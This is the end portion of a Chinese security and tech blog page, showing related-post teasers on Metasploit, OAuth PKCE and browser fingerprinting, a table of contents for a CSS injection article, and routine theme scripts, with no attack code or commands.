核心思想：提供一个通用的、模块化的监听接口，等待远程目标系统主动连接，从而建立一个控制通道。它与用于生成Payload的msfvenom紧密配合，实现无缝的端到端攻击链。   一、exploit/multi/handler 简介1.1 什么是 exploit/multi/handler？exploit/multi/handler 是 Metasploit 中的一个混合型模块 (Auxiliary&#x2F;Exploit)。它被归类为 exploit，因为它最终目的是“利用”系统并获得 Shell，但它实际上不包含任何漏洞利用代码。它的主要功能是：  监听反...</div></div></div></a><a class="pagination-related" href="/ffc98223e029/" title="OAuth2.0 PKCE机制详解：提升公共客户端安全性的标准实践"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-02.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">OAuth2.0 PKCE机制详解：提升公共客户端安全性的标准实践</div></div><div class="info-2"><div class="info-item-1"> OAuth 2.0 (Open Authorization 2.0) 是一种授权框架，允许第三方应用程序在不获取用户凭据的情况下访问用户在另一个服务商的受保护资源。然而，传统的 OAuth 2.0 授权码流在某些客户端类型（如公共客户端，Public Clients）中存在安全隐患。为了解决这些问题，PKCE（Proof Key for Code Exchange by OAuth Public Clients） 机制应运而生。  核心思想：PKCE 通过在授权码流中引入一个动态生成的密钥对，有效防止了授权码被恶意截取后被非法使用的风险，极大增强了公共客户端（如移动应用、单页应用）的安全性。    一、为什么需要 PKCE？公共客户端面临的挑战传统的 OAuth 2.0 授权码流 (Authorization Code Flow) 是最安全、最推荐的流程，它通过将授权码 (Authorization Code) 发送给客户端，然后客户端使用授权码和客户端秘钥 (Client Secret) 交换访问令牌 (Access Token)。 然而，这种传统的授权码流在用于公共客户端 ...</div></div></div></a><a class="pagination-related" href="/29965d782f2a/" title="Metasploit 框架详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-25.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-18</div><div class="info-item-2">Metasploit 框架详解</div></div><div class="info-2"><div class="info-item-1"> Metasploit 框架 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。  核心思想：将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。   一、Metasploit 简介1.1 什么是 Metasploit？Metasploit 是由 Rapid7 公司维护的一个著名的开源项目。它是一个漏洞利用框架，旨在协助渗透测试人员识别、利用和验证漏洞。它不仅仅是一个简单的漏洞扫描器，更是一个提供多种工具和方法的集成环境，几乎覆盖了渗透测试的整个生命周期。 1.2 Metasploit 的发展历史 2003年：由 H.D. Moore 发起，最初是一个 Perl 语言的项目。 2004年：发布 2.0 版本，首次引入了模块化架构。 2007年：框架被重写，使用 Ruby 语言，提高了灵活性和可维护性。 209年：Rapid7 收购 Metasploit 项目，并继续其开发...</div></div></div></a><a class="pagination-related" href="/902d004f5ccc/" title="浏览器指纹 (Browser Fingerprinting) 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-16.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">浏览器指纹 (Browser Fingerprinting) 详解</div></div><div class="info-2"><div class="info-item-1"> 浏览器指纹 (Browser Fingerprinting) 是一种用于识别或追踪用户在线行为的技术，即使在用户清除了 cookies、使用无痕模式甚至更换 IP 地址之后，它也能尝试标识出唯一的用户或设备。与 cookies 不同，浏览器指纹不是存储在用户设备上的数据，而是通过收集用户浏览器的各种配置和设置信息来生成的。  “你的浏览器就像你的手纹一样，看似普通，却独一无二。”   一、什么是浏览器指纹？浏览器指纹是指网站或在线服务通过收集用户浏览器和设备的大量可公开信息（如操作系统、浏览器类型和版本、屏幕分辨率、字体、插件、MIME 类型、时区、语言设置、GPU 信息、Canvas 渲染结果、AudioContext 信息等），并将这些信息综合起来生成一个近似唯一的“指纹”，从而在一定概率上识别单个用户或设备的技术。 这个“指纹”的强大之处在于其持久性和隐蔽性，用户很难通过常规手段进行清除或规避。 二、浏览器指纹的工作原理网站通过 JavaScript 或其他客户端脚本，在用户访问时执行一系列操作来获取其浏览器和设备特征。这些特征包括： 1. HTTP 请求头信息 (HTT...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">TeaTang</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">507</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">227</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">84</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/teatang"><i class="fab fa-github"></i><span>GitHub主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:tea.tang1211@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站更多功能即将上线，敬请期待！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81CSS-%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BA%A7%E7%94%9F%E6%9C%BA%E5%88%B6"><span class="toc-text">一、CSS 注入的产生机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CSS-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BD%9C%E5%9C%A8%E5%8D%B1%E5%AE%B3%E4%B8%8E%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-text">二、CSS 注入的潜在危害与攻击场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96-Data-Exfiltration"><span class="toc-text">2.1 数据窃取 (Data Exfiltration)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E4%B8%8E%E9%92%93%E9%B1%BC-Page-Defacement-Phishing"><span class="toc-text">2.2 页面篡改与钓鱼 (Page Defacement &amp; Phishing)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B-Information-Gathering"><span class="toc-text">2.3 信息探测 (Information Gathering)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E7%BB%95%E8%BF%87-CSP-Content-Security-Policy-%E6%9C%89%E9%99%90%E6%83%85%E5%86%B5"><span class="toc-text">2.4 绕过 CSP (Content Security Policy) (有限情况)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-UI-%E9%87%8D%E7%BB%98-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81-UI-Redressing-Clickjacking"><span class="toc-text">2.5 UI 重绘&#x2F;点击劫持 (UI Redressing&#x2F;Clickjacking)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81CSS-%E6%B3%A8%E5%85%A5%E7%9A%84%E8%AF%86%E5%88%AB%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="toc-text">三、CSS 注入的识别与检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81CSS-%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="toc-text">四、CSS 注入的防御策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E8%BE%93%E5%87%BA%E7%BC%96%E7%A0%81-%E8%BD%AC%E4%B9%89-Output-Encoding-Escaping"><span class="toc-text">4.1 输出编码&#x2F;转义 (Output Encoding&#x2F;Escaping)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%B8%85%E7%90%86-%E7%99%BD%E5%90%8D%E5%8D%95-Sanitization-Whitelisting"><span class="toc-text">4.2 清理&#x2F;白名单 (Sanitization&#x2F;Whitelisting)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-Content-Security-Policy-CSP"><span class="toc-text">4.3 内容安全策略 (Content Security Policy, CSP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81-Input-Validation"><span class="toc-text">4.4 输入验证 (Input Validation)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99"><span class="toc-text">4.5 最小权限原则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">五、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/1d2a942bda1e/" title="Terraform 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Terraform 详解"/></a><div class="content"><a class="title" href="/1d2a942bda1e/" title="Terraform 详解">Terraform 详解</a><time datetime="2026-01-19T22:24:00.000Z" title="发表于 2026-01-20 06:24:00">2026-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/26cdb2447b3d/" title="WebView 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WebView 详解"/></a><div class="content"><a class="title" href="/26cdb2447b3d/" title="WebView 详解">WebView 详解</a><time datetime="2026-01-17T22:24:00.000Z" title="发表于 2026-01-18 06:24:00">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/e62a1e8acade/" title="AI 辅助编程的关键要点与代码幻觉防范"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-02.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AI 辅助编程的关键要点与代码幻觉防范"/></a><div class="content"><a class="title" href="/e62a1e8acade/" title="AI 辅助编程的关键要点与代码幻觉防范">AI 辅助编程的关键要点与代码幻觉防范</a><time datetime="2026-01-15T22:24:00.000Z" title="发表于 2026-01-16 06:24:00">2026-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/d863aad4b106/" title="Trivy (通用安全扫描器) 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-31.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Trivy (通用安全扫描器) 详解"/></a><div class="content"><a class="title" href="/d863aad4b106/" title="Trivy (通用安全扫描器) 详解">Trivy (通用安全扫描器) 详解</a><time datetime="2026-01-10T22:24:00.000Z" title="发表于 2026-01-11 06:24:00">2026-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/fa3d796f3333/" title="MessagePack 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-06.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MessagePack 详解"/></a><div class="content"><a class="title" href="/fa3d796f3333/" title="MessagePack 详解">MessagePack 详解</a><time datetime="2026-01-08T22:24:00.000Z" title="发表于 2026-01-09 06:24:00">2026-01-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover/default_cover-13.jpg);"><div class="footer-flex"><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">我的轨迹</div><div class="footer-flex-content"><a href="/archives/2023/" target="_blank" title="🆕 2023">🆕 2023</a><a href="/archives/2024/" target="_blank" title="🆒 2024">🆒 2024</a><a href="/archives/2025/" target="_blank" title="👨‍👩‍👦 2025">👨‍👩‍👦 2025</a><a href="/archives/2026/" target="_blank" title="🆙 2026">🆙 2026</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">维度</div><div class="footer-flex-content"><a href="/categories/" target="_blank" title="📁 分类">📁 分类</a><a href="/tags/" target="_blank" title="🔖 标签">🔖 标签</a><a href="/categories/" target="_blank" title="📽️ 时间线">📽️ 时间线</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">其他</div><div class="footer-flex-content"><a href="/shuoshuo" target="_blank" title="💬 说说">💬 说说</a></div></div></div></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2023 - 2026 By TeaTang</span><span class="framework-info"><span class="footer-separator">|</span><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  const applyThemeDefaultsConfig = theme => {
+    if (theme === 'dark-mode') {
+      Chart.defaults.color = "rgba(255, 255, 255, 0.8)"
+      Chart.defaults.borderColor = "rgba(255, 255, 255, 0.2)"
+      Chart.defaults.scale.ticks.backdropColor = "transparent"
+    } else {
+      Chart.defaults.color = "rgba(0, 0, 0, 0.8)"
+      Chart.defaults.borderColor = "rgba(0, 0, 0, 0.1)"
+      Chart.defaults.scale.ticks.backdropColor = "transparent"
+    }
+  }
+
+  // Recursively traverse the config object and automatically apply theme-specific color schemes
+  const applyThemeConfig = (obj, theme) => {
+    if (typeof obj !== 'object' || obj === null) return
+
+    Object.keys(obj).forEach(key => {
+      const value = obj[key]
+      // If the property is an object and has theme-specific options, apply them
+      if (typeof value === 'object' && value !== null) {
+        if (value[theme]) {
+          obj[key] = value[theme] // Apply the value for the current theme
+        } else {
+          // Recursively process child objects
+          applyThemeConfig(value, theme)
+        }
+      }
+    })
+  }
+
+  const runChartJS = ele => {
+    window.loadChartJS = true
+
+    Array.from(ele).forEach((item, index) => {
+      const chartSrc = item.firstElementChild
+      const chartID = item.getAttribute('data-chartjs-id') || ('chartjs-' + index) // Use custom ID or default ID
+      const width = item.getAttribute('data-width')
+      const existingCanvas = document.getElementById(chartID)
+
+      // If a canvas already exists, remove it to avoid rendering duplicates
+      if (existingCanvas) {
+          existingCanvas.parentNode.remove()
+      }
+
+      const chartDefinition = chartSrc.textContent
+      const canvas = document.createElement('canvas')
+      canvas.id = chartID
+
+      const div = document.createElement('div')
+      div.className = 'chartjs-wrap'
+
+      if (width) {
+        div.style.width = width
+      }
+
+      div.appendChild(canvas)
+      chartSrc.insertAdjacentElement('afterend', div)
+
+      const ctx = document.getElementById(chartID).getContext('2d')
+
+      const config = JSON.parse(chartDefinition)
+
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark-mode' : 'light-mode'
+
+      // Set default styles (initial setup)
+      applyThemeDefaultsConfig(theme)
+
+      // Automatically traverse the config and apply dual-mode color schemes
+      applyThemeConfig(config, theme)
+
+      new Chart(ctx, config)
+    })
+  }
+
+  const loadChartJS = () => {
+    const chartJSEle = document.querySelectorAll('#article-container .chartjs-container')
+    if (chartJSEle.length === 0) return
+
+    window.loadChartJS ? runChartJS(chartJSEle) : btf.getScript('https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.min.js').then(() => runChartJS(chartJSEle))
+  }
+
+  // Listen for theme change events
+  btf.addGlobalFn('themeChange', loadChartJS, 'chartjs')
+  btf.addGlobalFn('encrypt', loadChartJS, 'chartjs')
+
+  window.pjax ? loadChartJS() : document.addEventListener('DOMContentLoaded', loadChartJS)
+})()</script></div><script data-pjax src="/self/btf.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="ture"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,200,200" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div></body></html>
